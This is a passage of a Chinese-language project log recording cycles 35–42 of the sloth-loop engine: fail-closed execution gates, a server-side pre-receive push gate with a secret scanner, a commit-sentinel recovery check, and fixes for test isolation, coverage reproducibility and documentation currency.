- **C/D**：实测 1712/79.17 → **1717/79.41**（+5 用例，coverage +0.24：mcp 的无门分支被删除且被新用例覆盖）；head `706df02` → **`eb788b1`**；唤醒指针指向 cycle-35，「下一目标」标号同步到 §13.61；新增 `docs/design/2026-10-26-cycle35-A-guarded-is-a-registered-fact.md`。
- **残余（诚实口径）**：不变量 1 **仍 xfail**——但违规清单从「4 行（含 3 处宿主工具）」变为**准确的 5 处真业务绕过**；这 5 处是本轮**新发现**（此前被名字豁免掩盖），已列明 P0 修法（逐处接门，或像 `OODASteps._act` 那样让 `exec_gate` 必填 / fail-closed）。
- **已决定的边界**：① 登记按**文件 + 理由**（不是按调用点）——已登记文件内新增 spawn 不会自动报警，因此新增登记必须显式评审；② `_archive/` 与 `scripts/tmp/` 明确在域外（前者为归档、后者是 gitignore 的临时脚本）；③ 门可选适配器的「无门回退」本轮**判定为违规**（契约是单点出口），未修则该不变量保持 xfail。
- **未闭合项（顺延）**：N-3 / R3（真实厂商额度源 / 真实模型 24h soak，需挂载主机）维持 blocked；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱不做；低优先 `tool_registry.dispatch` / `tool_concurrency` 已于 cycle-16 闭合。
- **结论**：**「受门控 / 已覆盖」必须由可核对的登记证明，不能按名字推断**——名字级豁免既可伪造、又会掩盖真绕过；判定对象必须是显式登记的站点，取样域必须与声称的域一致，报告必须完整。至此「宽窄不对称」族推进到**不变量自己**：cycle-32 值 / cycle-33 触发 / cycle-34 作用域 / **cycle-35 判定证据**。候选冻结项（N-3 / R3 / coze I-1/I-3/I-4 / cycle-12 条目 11/12/13）维持不变。
- **验收**：`pytest tests sloth_engine/tests -q` → 1717 passed / 1 xfailed / 79.41%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；B 侧三命令全绿。

### 13.62 cycle-36 A/B · 可选依赖必须 fail-closed：安全关键参数为 None 时不得静默降级：TES-31 / DOC-22

- **本轮原动力**：cycle-35 把不变量 1 的豁免从「名字」改成「登记」，但登记只回答了「谁在域内」；契约的另一半——调用方**忘记注入** gate 时怎么办——从未被检查。
- **红证据（实测）**：`adapters/backtest_adapter.py` 的 `probe_provenance` / `run_backtest` / `_legacy_run_backtest` 三处都是 `if exec_gate is not None: … else: subprocess.run(...)`；`ooda_pipeline.py` 的 `_run_callback` / `_verify_regression` 直接 `import subprocess as sp` 裸跑。也就是说**唯一出口**在「忘记注入」时静默退回裸 spawn——单点出口退化成一承诺。安全关键参数写成「可选」、缺省即不安全路径，等于把门禁变成 opt-in。
- **A 修复（commit `8c6edb2`，+5 用例）**：**无门即无 spawn** —— ① `backtest_adapter` 三处 `else` 分支删除，`exec_gate is None` 时失败关闭（探针返回 None；`run_backtest` 返回 `error_code=exec_gate_required`；legacy 返回构造期错误）；② `ooda_pipeline` 两个 sink 改经 `ExecGate.run`，有 `runtime` 就用它绑定同一个门的组合根，两者皆无则**拒绝 spawn**（detail 含 fail-closed），并删掉 `import subprocess as sp`；③ `evolution_bridge` 新增 `exec_gate=` 参数与**零参提供者**（调用时解析，避免项目 overlay 重建 runtime 后钉死旧门），`evolution_loader` 组合根注入；④ 新增 `runtime_exec.local_exec_gate()` 作为测试 / 本地构造**真门**的唯一入口（只构造、不 spawn）。新增 5 例：适配器无门失败关闭且零 spawn / 探针无门返回 None 且零 spawn / OODA 两个 sink 无门拒绝 / orchestrator 把同一个门接给 evolution bridge。
- **B 轮（architect-skills commit `e1c5718`）**：`architect-test` 30→**31**（TES-31）、`architect-docs` 21→**22**（DOC-22）——安全关键参数 / 依赖缺失时必须 **fail-closed**（拒绝执行 + 可核对错误码），不得静默退回不安全路径；任何保留的降级都必须作为**显式登记的决定**（文件 + 理由 + 作用对象）且仍须命中真站点；自证 = 去掉一个真调用点的门必须变红且零 spawn。文档侧：描述「可选依赖 / 未配置时回退」必须写明**缺省即拒绝**，不得用「可选」掩盖「忘记注入」，并须说明生产组合根在哪里注入。`validate-contracts.mjs` → 19 atom / 0 错 / 0 警、`run-l1-tests.mjs` → 32 passed、跨仓账本 unexplained 0 / exit 0。
- **C/D**：实测 1717/79.41 → **1722/79.42**（+5 用例，coverage +0.01）；head `eb788b1` → **`8c6edb2`**；唤醒指针指向 cycle-36，「下一目标」标号同步到 §13.62；新增 `docs/design/2026-10-26-cycle36-A-no-gate-no-spawn.md`。
- **残余（诚实口径）**：契约不变量 1 **由 xfail 转绿**（0 xfailed）——5 处真业务绕过全部接门或失败关闭，`SPAWN_SANCTIONED` / `SPAWN_OUTSIDE_GATE` 登记仍逐条命中真站点。
- **已决定的边界**：① 登记按**文件 + 理由**（非调用点）；② `_archive/` 与 `scripts/tmp/` 在域外；③ 「无门回退」**不保留**——若将来确要为本地方便保留降级，必须作为**显式登记的决定**（文件 + 理由 + 作用对象），且登记须仍命中真站点、失效即报警（这正是 TES-31 / DOC-22 的口径）。
- **未闭合项（顺延）**：N-3 / R3 维持文档登记（用户裁定不做）；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱不做；低优先 `tool_registry.dispatch` / `tool_concurrency` 已于 cycle-16 闭合。
- **结论**：**可选的安全关键依赖必须失败关闭**——「可选」只描述注入方式，不描述缺省行为；缺省必须落在「拒绝」一侧，而不是不安全路径。至此「宽窄不对称」族补齐镜像面：cycle-32~35 修的是判定的**宽/窄**，本轮修的是**缺省方向**。
- **验收**：`pytest tests sloth_engine/tests -q` → 1722 passed / 0 xfailed / 79.42%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；B 侧三命令全绿。

### 13.63 cycle-37 A/B · 控制必须在被约束方无权的位置执行，且必须自证真的执行：TES-32 / DOC-23

- **本轮原动力**：cycle-36 收尾时把目光从「代码里的门禁」转向 **ROADMAP P0「fail-closed CI」**——它长期挂着，而实际唯一的门禁是本机 pre-commit 钩子。触发条件（多人/多机协作、准备发布）在本轮已满足，故不再挂起。
- **红证据（实测，三层同族）**：① **可被被约束方关闭**：`git commit --no-verify`、`git -c core.hooksPath=<别处>`、全新克隆（无钩子）三种方式都能让 `run_gate.py` 不运行——门禁由它要约束的那一方掌握开关；② **不在执行路径上**：实现服务端钩子时发现本机 **全局 `core.hooksPath`** 会把仓库自带的 `hooks/pre-receive` 静默替换（集成测试第一次跑就是「装了钩子但推送照样通过」）；③ **设置 ≠ 生效**：钩子 `.` 了配置文件，但变量**只 set 不 export**，门禁子进程根本收不到配置——于是它退回默认路径，报出「找不到 `<树>/scripts/run_gate.py`」。
- **A 修复（commit `310c918`，+28 用例）**：交付**服务端**（接收仓执行、推送方无开关）门禁——`scripts/content_scan.py`（密钥文件名 / 私钥头 / AWS AK id / 高熵硬编码凭据 / 代码与配置中的家目录路径；**对全仓 371 文件实测 0 误报**）+ `scripts/push_gate.py`（每个新 tip 用 `git archive`+`tarfile` 落树 → 内容扫描 → 在推来的树上跑本地门禁；超时 / 无法启动 / 归档越界一律拒绝）+ `scripts/pre-receive` + `scripts/install_push_gate.py`（安装**固定副本**——门禁代码不取自被推的树；**钉住 `core.hooksPath`**；配置 `export`）。自证含**真实 `git push`**：干净通过 / 密钥被拒 / red tests-half 被拒 / **推送内改写 `push_gate.py` 仍被拒** / 缺 bundle fail-closed / 安装备份与卸载还原；客户端钩子被显式指向空目录（等价 `--no-verify`）后仍被拦。
- **B 轮（architect-skills commit `aca352b`）**：`architect-test` 31→**32**（TES-32）、`architect-docs` 22→**23**（DOC-23）——一个控制若可被它约束的对象关闭就不是控制，强制点必须落在被约束方无权的位置（服务端），安装时必须**固定「选择该控制的开关」**，配置必须真正到达执行点（只设不导出 == 没生效），控制本体不得取自被约束内容；「已安装」不等于「已生效」，必须端到端自证。文档侧：宣称「已强制 / 已接入」必须写明执行点与**信任边界**、生效前提与验证方式，不得把「文件已存在」当成「会执行」。
- **C/D**：实测 1722/79.42 → **1750/79.42**（+28 用例，coverage 不变——新增代码在 `scripts/`，不在覆盖率口径内）；head `8c6edb2` → **`310c918`**；ROADMAP P0「fail-closed CI」标记**已交付**（模式 A：pre-receive），剩余为**部署动作**（在目标接收仓跑一次安装器）；唤醒指针指向 cycle-37，「下一目标」标号同步到 §13.63；新增 `docs/design/2026-10-26-cycle37-A-failclosed-push-gate.md`。
- **残余（诚实口径）**：① 门禁的「tests 半」是**宿主配置** `LOOP_PUSH_GATE_CMD` 指定的命令，默认 `python scripts/run_gate.py --all`——这是唯一能削弱检查的地方，属接收主机的管理员权限（信任边界已写进代码与文档）；② **hosted CI 未接入**（无远程托管），本项交付 pre-receive 形态；③ 内容扫描只覆盖代码 / 配置域，事件日志的绝对路径污染仍由 `tests/test_runtime_artifact_containment.py` 覆盖。
- **已决定的边界**：① 「泛化绝对路径」「长 token 熵」不做（仓库自身文档合法引用 `<WORKSPACE_ROOT>`，这类规则是噪声而不是保护）——省略项由**对全仓语料的实测**钉住；② 安装器不自动安装到用户的活跃接收仓（那是部署决策，一行命令即可）；③ 客户端侧钩子保持现状（本地便利），强制由服务端承担。
- **未闭合项（顺延）**：migration sentinel RPO（P0，依赖本项，下一步）；N-3 / R3 维持文档登记；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱 / P2 OS 沙箱不做。
- **结论**：**能被被约束方关掉的控制不是控制，装了不等于会跑**——强制点必须在被约束方无权的位置执行，安装时必须固定选择它的开关，配置必须真正到达执行点，控制本体不得来自被约束内容，且必须有端到端自证。至此「守卫族」从**代码内的门禁**推进到**仓库边界的门禁**：cycle-35 判定证据 / cycle-36 缺省方向 / **cycle-37 强制点的权限与生效**。
- **验收**：`pytest tests sloth_engine/tests -q` → 1750 passed / 0 xfailed / 79.42%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`scripts/audit_cross_repo_ledger.py` → unexplained 0；B 侧三命令全绿。
- **同轮新鲜副本验证（handoff 场景，本轮实测）**：`git clone` 到空目录后全量回归 1756 passed / 0 xfailed，`scripts/run_gate.py --all` **PASS**（副本实测 coverage 79.35% vs 本机 79.47%，落在 `COVERAGE_TOLERANCE = 0.15` 内；剩余余量 0.02pp）。差异来自本地 `sloth_engine/data/patterns.db` 的**内容**：旧库有 61 rounds / 52 run_learns / 10 failure / 8 success 等行，使 `test_v2_p1p2` 调用的 store 读取循环路径被覆盖；空库（新鲜副本）不走那些行。**结论：交付包可被新 agent 从零跑通**，但基线 coverage 仍与本机状态有 0.12pp 的耦合（见上条候选）。
- **同轮登记（未改的候选）②**：`scripts/run_gate.py` 的通过行直接打印原始比较串 —— 副本实测 79.35% 时输出「coverage 79.35% >= 79.47%」，**阀值本身自相矛盾**（真正生效的判定含 `COVERAGE_TOLERANCE = 0.15` 宽容）。判定行为正确，信息口径不对——属「消息口径必须与判定一致」同族，待下一轮修。

### 13.64 cycle-38 A/B · 由被观测方声明的「事实」不是事实：TES-33 / DOC-24

- **本轮原动力**：cycle-37 交付 fail-closed CI 后，ROADMAP P0 的顺序表指向 **migration sentinel RPO**（其依赖已满足）。取证直指 RPO 的**证据形态**：`rpo.mode = "row_count_proxy"` / `verified=false`。
- **红证据（实测）**：① **代理冒充语义**——行数相等证明不了「恢复到某个已提交业务单元」，同一行数可由「删一行 + 加一行」得到，却被当作「可恢复到某时刻」的恢复能力证据；② **标记由应用声明**——旧口径的 `last_committed` 只是 `_row_count(source_snapshot)` 求和，是承诺不是事实；只要有一条写入路径漏写、或补写前崩溃，标记就比事实更乐观；③ **无原子性**——派生量与业务写入之间没有任何一致性约束。
- **A 修复（commit `529ec97`，+6 用例）**：schema v6 `commit_sentinel(seq, scope, committed_at)`（append-only），由 SQLite 触发器在 `rounds` / `run_learns` / `failure_patterns` / `success_patterns` / `l2_suggestions` 的 INSERT/UPDATE 上写入——标记由数据库在**同一事务**内产生，任何应用写入路径都绕不过，**业务写入回滚后不留标记**；`committed_at` 为 UTC ISO-8601 毫秒精度、字典序可排，`seq` 同毫秒消歧；引入时对既有行**恰好回填一次**，`down` 只丢弃标记表与触发器、可重放重建。演练（`scripts/migration_rehearsal.py`）在隔离副本上实测业务时间点：记录 backup cutoff → 真实提交 M 笔业务行（经 `PatternStore`）→ 从 cutoff 备份恢复 → 断言哨兵**恰好等于** cutoff，`rpo.mode = "sentinel_timestamp"` / `verified = true`，输出 `restores_to_cutoff` / `units_lost_on_restore` / `window_ms`；哨兵缺失即 fail-closed。
- **B 轮（architect-skills commit `fbe1f91`）**：`architect-test` 32→**33**（TES-33）、`architect-docs` 23→**24**（DOC-24）——标记必须由承载事实的那一层在同一原子操作内产生（触发器 / 约束 / 同事务），任何应用写入路径都绕不过；**代理指标不得冒充语义指标**；历史回填必须恰好一次且可重放重建；自证必须含「业务写入回滚后标记不存在」与「标记缺失 fail-closed」。文档侧：不得把代理指标写成语义指标，必须写明生产者与原子性口径、历史回填口径、作用域（演练 / 生产实测）与未覆盖范围。
- **C/D**：实测 1750/79.42 → **1756/79.47**（+6 用例）；head `310c918` → **`529ec97`**；ROADMAP P0「migration sentinel RPO」标记**已交付**，执行顺序表前二项均已完成；唤醒指针指向 cycle-38，「下一目标」标号同步到 §13.64；新增 `docs/design/2026-10-26-cycle38-A-migration-sentinel-rpo.md`。真实库证据：本机 `sloth_engine/data/patterns.db` v5→v6 显式迁移（`migrate.py up --backup`，回填 **131** 行哨兵 = 10 failure_patterns + 8 success_patterns + 61 rounds + 52 run_learns，integrity ok、foreign_key_errors 0）。
- **残余（诚实口径）**：① 演练证明的是「按记录 cutoff 恢复会精确落回该 cutoff」，**不是生产停写窗口实测**——生产 RTO/RPO 仍需按 runbook 复核；② 历史行的 `committed_at` 是**迁移时刻**（「确认已提交」水印），不是真实提交瞬时时间；③ 哨兵不覆盖 `schema_versions` 迁移账本本身（它有自己的 checksum + integrity 校验）。
- **同轮登记（未改的候选）**：`tests/test_v2_p1p2.py` 在**收集期**打开仓库内 `sloth_engine/data/patterns.db`（git 忽略的本地库）：fresh clone 会在仓库里创建 DB、旧版本库会让整套测试 fail-closed；属「测试卫生 / 隔离」同族，改动面涉该文件 75 个用例与 `_ENGINE/data` 报告落点，本轮只登记。
- **已决定的边界**：① 不在生产停写窗口做实测（无生产环境，且已由 runbook 明确为上线前置）；② 不为历史行伪造真实提交时间；③ 哨兵只覆盖业务表，不覆盖迁移账本。
- **未闭合项（顺延）**：N-3 / R3 维持文档登记（用户裁定不做）；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱 / P2 OS 沙箱不做；REST/Webhook 等第 2 个真实多模块任务（前置 W2-BOUNDARY-01）。
- **结论**：**由被观测方自己声明的「事实」不是事实**——证据的价值取决于它由哪一层产生：只有与业务写入同一原子操作产生的标记，才配被称为恢复点；代理指标（行数）必须显式标注为代理，不得冒充语义指标（时间点）。至此「守卫族」补齐第三面：cycle-35 判定证据 / cycle-36 缺省方向 / cycle-37 强制点的权限 / **cycle-38 证据的生产者与原子性**。
- **验收**：`pytest tests sloth_engine/tests -q` → 1756 passed / 0 xfailed / 79.47%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`scripts/audit_cross_repo_ledger.py` → unexplained 0；B 侧三命令全绿。

### 13.65 cycle-39 A/A2/B · 测试的输入必须自建且确定，门禁的输出必须与判定同源：TES-34 / DOC-25

- **本轮原动力**：cycle-38 收尾的**新鲜副本（handoff）验证**登记了两条候选——`tests/test_v2_p1p2.py` 在**收集期**打开仓库内运行态库；`scripts/run_gate.py` 的通过行与判定不同源。本轮把两条都实测复现并修完。
- **红证据（实测，两条同族）**：① **测试观察的是「机器」而不是「被测系统」**——全新克隆仅 `pytest --collect-only tests/test_v2_p1p2.py` 就写出约 110KB 的 `sloth_engine/data/patterns.db` 进代码树；把一份旧版（v5）库放进树后，整套 pytest 在**收集期**直接 ERROR（`RuntimeError: database migration required: v5 -> v6`），一个无关模块把整个会话打成「no tests collected」。② **门禁消息与判定不同源**——`run_gate.py` 判定 `measured + 0.15 >= recorded`，通过行却打印 `coverage 79.35% >= 79.47%`（字面为假的不等式）。
- **A 修复（commit `9f2d5f3`，+3 用例）**：`test_v2_p1p2.py` 的模块级 store 改为**私有临时库 + 确定性种子**（failure / success / round / run_history），并新增 `test_store_is_isolated_from_the_repo_tree`；`run_gate.py` 抽出 `coverage_floor(recorded) = recorded - tolerance` 作唯一定义，判定改用 `measured < floor`，通过行打印 `coverage X% >= floor Y% [recorded Z%, slack S%]`，失败行同口径；新增 2 例钉住「刚好落在容差内」的通过路径与 `recorded - floor == slack`。
- **A2 修复（commit `142fb5d`，同族补齐）**：逐文件扫描（每个测试文件单独跑、检查仓库内 db）发现**另有 5 个写入点**——`test_webui_auth_config.py`（用默认数据目录建库来验证默认路径）、`test_webui_static.py`（`/api/health` 走默认数据目录）、`test_contract_invariants.py`、`test_evolution_bridge.py`（用仓库 `config.yaml` 构造 `Orchestrator`，`memory.sqlite_path` 相对 → 解析到仓库 `data/`）、`test_loop.py` 的 CLI 冒烟（真实子进程跑 `--doctor/--status`，默认库落仓库）。全部切到私有临时库 / 临时配置（`memory.sqlite_path` → tmp），只改路径不改 containment 语义。
- **B 轮（architect-skills commit `f50b574`）**：`architect-test` 33→**34**（TES-34）、`architect-docs` 24→**25**（DOC-25）——测试的输入必须由测试自身构造（运行态不是测试输入，不得读写被测仓库树内的运行态；私有临时目录 + 确定性种子；**收集期零副作用**；反证必须实测：旧库 / 缺库 / 损坏库下结果一致；钉一条「store 路径在仓库树之外」的回归测试）；门禁 / 校验器 / 报告的**通过消息必须与判定同源**（同一表达式取反，容差必须显式给出实际生效下界，失败行同口径，并有用例钉住临界通过路径）。
- **C/D**：实测 1756/79.47 → **1759/79.48**（+3 用例）；head `529ec97` → **`142fb5d`**；唤醒指针指向 cycle-39，「下一目标」标号同步到 §13.65；新增 `docs/design/2026-10-26-cycle39-A-test-isolation.md`；ROADMAP / CHANGELOG 同步。
- **验证（新鲜副本 handoff 场景，两场景实测）**：`git clone` 到空目录后全量 **1759 passed / 0 xfailed / 79.48%**，跑完仓库树**零写入**（`git status` 干净）；在副本里预置一份 v5 旧库再跑，同样 **1759 / 79.48%**（修复前该场景为「no tests collected, 1 error」），且旧库未被改写（ledger 仍为 5）。本仓库全量同为 1759 / 79.48%——基线由此从「与本机 DB 内容耦合（cycle-38 观测到 0.12pp 差）」变为**确定性**。
- **残余（诚实口径）**：① 本轮的隔离只覆盖「sloth_engine/data/patterns.db」这一耦合点；测试仍会创建仓库根下 `_data/`、`work_ooda/`、`logs/` 等 **gitignore 的运行态目录**（历史行为，不是本轮缺陷族）；② 门禁仍是**本地**软约束（`--no-verify` / `core.hooksPath` 可绕过）——强制由 cycle-37 的 pre-receive 服务端门禁承担；③ `run_gate` 的宽容 0.15pp 仍存在（本轮只统一口径，未收紧策略）。
- **未闭合项（顺延）**：N-3 / R3 维持文档登记（用户裁定不做）；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱 / P2 OS 沙箱不做；REST/Webhook 等第 2 个真实多模块任务（前置 W2-BOUNDARY-01）。
- **结论**：**测试观察的必须是被测系统，不是它碰巧运行的那台机器**——测试输入要自建且确定，收集期不得有副作用；**门禁的通过消息必须与判定同源**，容差必须显式。至此「守卫族」再补两面：cycle-35 判定证据 / cycle-36 缺省方向 / cycle-37 强制点的权限 / cycle-38 证据的生产者与原子性 / **cycle-39 测试的观察对象与门禁消息的同源性**。
- **验收**：`pytest tests sloth_engine/tests -q` → 1759 passed / 0 xfailed / 79.48%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`scripts/audit_cross_repo_ledger.py` → unexplained 0；B 侧 `validate-contracts.mjs` → 19 atom / 0 错 / 0 警 + `run-l1-tests.mjs` → 32 passed。

### 13.66 cycle-40 A/A2/B · 测试结论必须可复现——残留与并发时序都不得决定结果：TES-35 / DOC-26

- **本轮原动力**：cycle-39 的「新鲜副本（handoff）验证」登记了一条残差——干净克隆 79.47% vs 本机 79.48%，差 1 条分支。本轮把它当作观测噪声实测复现，定位到三层「结果不由被测系统决定」的耦合。
- **红证据（实测，三层漂移）**：① `sloth_engine/tests/_tmp_*`（插件草稿包，gitignored）跨运行残留 → `dsh-mneme` / `dsh-rag-kb` 的 `_ensure` 在「store 已存在 / 缺失」间翻转（90%/88%、70%/69%）；② `run_reporter._archive_raw_io` 最后一级回退直读仓库根 `_data`（热机有、干净克隆无，88%/89%）；③ `sub_agent.AgentRegistry._release` 的循环 / if 分支只被线程竞态覆盖——同一命令连跑 6 次，4 次记 4 partial、2 次记 5 partial（79.48% vs 79.47%）。
- **A 修复（commit `74253b4`，+0 用例）**：新建 `sloth_engine/tests/conftest.py`（session 级 autouse 夹具清理 `_tmp_*`）；把 `run_reporter` 的仓库根回退抽成可注入的 `run_reporter._data_root()`，`test_archive_raw_io_missing_is_non_fatal` 用 `monkeypatch` 把它指到空的临时目录。
- **A2 修复（commit `7471e41`，+1 用例）**：新增单线程测试直接驱动 `AgentRegistry._release` 的三种形状（走过非匹配项后再命中 / 首项即命中 / 孤儿槽位使扫描自然耗尽），让分支覆盖不再依赖线程时序；原并发测试保留。
- **B 轮（architect-skills commit `741eb96`）**：`architect-test` 34→**35**（TES-35）、`architect-docs` 25→**26**（DOC-26）——测试的**结论**必须可复现（登记基线 = 干净克隆可逐字重现的观测）；跨运行残留与并发时序都不得决定结果；若某幅度无法消除，必须登记幅度与容差，且登记值取**可复现**的一侧；「落在容差内」不得掩盖「两次结果不同」。
- **C/D**：实测 1759/79.48 → **1760/79.49**（+1 用例）；head `142fb5d` → **`7471e41`**；唤醒指针指向 cycle-40，「下一目标」标号同步到 §13.66；新增 `docs/design/2026-10-27-cycle40-A-test-reproducibility.md`；ROADMAP / CHANGELOG 同步。
- **验证（可复现，实测）**：同一命令连续两次 **1760 passed / 0 xfailed / 79.49%**（4424/670）逐字一致；`git clone` 到空目录后全量同值、跑完仓库树**零写入**（`git status` 干净）。
- **残余（诚实口径）**：① 本轮消除的是「测试自身残留 + 并发时序」两类耦合；仓库根 `_data/`、`work_ooda/`、`logs/` 等 gitignore 运行态目录仍会被部分历史测试创建；② `conftest.py` 自身在「干净（无 `_tmp_*`）」与「热机（有 `_tmp_*`）」下命中不同的单条分支，但 partial 计数相同，故总计数不受影响。
- **未闭合项（顺延）**：N-3 / R3 维持文档登记（用户裁定不做）；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱 / P2 OS 沙箱不做；REST/Webhook 等第 2 个真实多模块任务（前置 W2-BOUNDARY-01）。
- **结论**：**测试结论必须可复现**——登记的基线不是「一次性读数」，而是干净克隆可逐字重现的观测；测试自身的残留与并发时序都不许决定结果。至此「守卫族」在 cycle-39（观察对象 / 消息同源）之上，再补「结论的可复现性」。
- **验收**：`pytest tests sloth_engine/tests -q` → 1760 passed / 0 xfailed / 79.49%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`scripts/audit_cross_repo_ledger.py` → unexplained 0；B 侧 `validate-contracts.mjs` → 19 atom / 0 错 / 0 警 + `run-l1-tests.mjs` → 32 passed。

### 13.67 cycle-41 A · 交接入口文档必须被口径守护覆盖 —— START.md 纳入 CHECK_FILES（B 待补）

- **本轮原动力**：打包交接包（`sloth-loop-new`）复核时逐个打开入口文件核对——发现新 agent 第一个读的 `START.md` 仍写着「期望 1159 passed / cov ~71.76%」，而当时基线已是 1760 / 79.49%。
- **红证据（实测）**：`docs_baseline.check() == []`，同时 `START.md:24` / `START.md:35` 引用旧数字（比实测少 601 个用例）。根因是 `CHECK_FILES` 这份**手写清单**没有收录 `START.md` —— 与被校验的文档相比，清单本身无人校验（cycle-24 唤醒指针缺口的同族，只是对象换成「交接入口」）。
- **A 修复（commit `fc492f0`，用例数不变）**：`START.md` 两处数字更新为 1760 / 0 xfailed / 79.49%（fail_under=70）；`scripts/docs_baseline.py` 的 `CHECK_FILES` 纳入 `START.md`；`tests/test_gate_self_verification.py` 的「作用域 pin」与「漂移负控」由只覆盖唤醒指针改为覆盖**两份入口文档**（`WAKE_POINTER` + `HANDOFF_ENTRY`）。
- **C/D**：口径不变（**1760 / 79.49%**，仅 `head` 前移 `7471e41` → `fc492f0`）；唤醒指针指向 cycle-41，「下一目标」标号同步到 §13.67；新增 `docs/design/2026-10-27-cycle41-A-handoff-entry-doc-covered.md`；ROADMAP / CHANGELOG 同步。
- **残余（诚实口径）**：① 本轮只纳入 `START.md` 这类「交接入口」；`sloth_engine/README.md`（v3.4 头，490 passed）与 `docs/sloth-loop-项目介绍与规划.md` 仍不在清单内，是否属当前态需裁定（**已登记候选**）；② B 轮（architect-skills 不变量）本轮未做。
- **未闭合项（顺延）**：N-3 / R3 维持文档登记（用户裁定不做）；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱 / P2 OS 沙箱不做；REST/Webhook 等第 2 个真实多模块任务（前置 W2-BOUNDARY-01）。
- **结论**：**交接入口也必须被守护覆盖**——一份「谁第一个读」的入口文档若不在守护清单内，它的数字就会静默腐烂（差 601 个用例仍显示 OK）。判定「当前态文档」的清单本身必须把入口文档全部列出，并由用例钉住。
- **验收**：`pytest tests sloth_engine/tests -q` → 1760 passed / 0 xfailed / 79.49%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`scripts/audit_cross_repo_ledger.py` → unexplained 0。


### 13.68 cycle-42 A · 当前态文档守护的清单必须随交付面扩大 —— QUICKSTART / 引擎 README / 项目介绍纳入 CHECK_FILES（B 待补）

- **本轮原动力**：cycle-41 收口后交付包逐文件复核（用户要求「确保 loop 相关文档 / README 都更新到最新」），发现 5 处当前态文档与基线 **1760 / 0 xfailed / 79.49%** 不一致，其中 4 处是**旧基线数字**（`Prompt.md` 头 1282、`QUICKSTART`「700+ / coverage≥64%」、`sloth_engine/README.md` v3.4 头 490、`docs/sloth-loop-项目介绍与规划.md` 1194）。
- **红证据（实测）**：`docs_baseline.check() == []`，同时这些数字陈旧——`CHECK_FILES` 这份**手写清单**未收录它们（cycle-24 唤醒指针 / cycle-41 START.md 的同族，对象随交付面继续外扩）；另 `docs/sloth-loop-AS-BUILT.md:158` 的「当前实测 1255 / 72.68%」与本文件头部自相矛盾；`docs/LOOP-ESSENCE-AND-LEARNINGS.md` 的错21 段**编码损坏**（非 ASCII 字节全部替换为 `?`，git 历史中亦已损坏，无法恢复原文）。
- **A 修复（commit `b875f4e`，用例数不变）**：7 份文档数字 / 口径修正（错21 段按未损坏标识符忠实重建）；`CLAUDE.md:49` / `ROADMAP.md:28` 的「coverage ≥64」→ `≥ fail_under=70`；`scripts/docs_baseline.py` 的 `CHECK_FILES` **11→14**（+`docs/sloth-loop-QUICKSTART.md` / +`sloth_engine/README.md` / +`docs/sloth-loop-项目介绍与规划.md`，中文路径用 `\u` 转义保持源码 ASCII）；`tests/test_gate_self_verification.py` 的作用域 pin 与漂移负控由 2 份扩到 5 份（`ENTRY_DOCS`，改写既有用例）。
- **C/D**：口径不变（**1760 / 79.49%**，仅 `head` 前移 `fc492f0` → `b875f4e`）；唤醒指针指向 cycle-42，「下一目标」标号同步到 §13.68；新增 `docs/design/2026-10-27-cycle42-A-doc-currency.md`；ROADMAP / CHANGELOG 同步。
- **残余（诚实口径）**：① 新增 3 份入口文档须各自承载基线 token 才被守护（故 `sloth_engine/README.md` 头部显式指向 `docs/baseline.json`）；② 历史 / 日期化文档（`docs/design/*`、ADR、CHANGELOG、`docs/flow/2026-09-05-*`、`knowledge-distillation`）刻意不纳入；③ B 轮（architect-skills 不变量）本轮未做。
- **未闭合项（顺延）**：N-3 / R3 维持文档登记（用户裁定不做）；coze I-1/I-3/I-4、cycle-12 条目 11/12/13 维持 candidate-pending；WebUI / 每项目文件沙箱 / P2 OS 沙箱不做；REST/Webhook 等第 2 个真实多模块任务（前置 W2-BOUNDARY-01）。
- **结论**：**判定「当前态文档」的清单必须随交付面同步扩大**——凡交付包内引用同一套基线的入口 / 组件 / 介绍文档，都必须在守护清单内；否则其数字会静默腐烂（本轮 4 处分别差 478 / 566 / 1270 个用例仍显示 OK）。
- **验收**：`pytest tests sloth_engine/tests -q` → 1760 passed / 0 xfailed / 79.49%；`scripts/run_gate.py --all` → PASS；`docs_baseline.check() == []`；`scripts/audit_cross_repo_ledger.py` → unexplained 0。
